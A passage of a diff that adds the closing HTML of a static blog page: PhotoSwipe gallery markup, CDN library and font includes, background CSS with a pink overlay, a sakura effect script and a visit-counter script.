+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.a2bdfcd44ef572203220652568b318b0d339e1b66627df894cad45601e4caa56.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+     
+    background: url("/background/Ai.jpg") no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+     
+    margin: 0;  
+    min-height: 100vh;  
+  }
+
+ 
+  .container {
+    position: relative;
+  }
+  .container::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fda2e363; 
+    z-index: -1; 
+  }  
+
+
+
+
+  
+
+
+</style>
+<script src="/background/sakura.js"></script>
+
+
+
+<script defer src="https://cn.vercount.one/js"></script>
+
+    </body>
+</html>
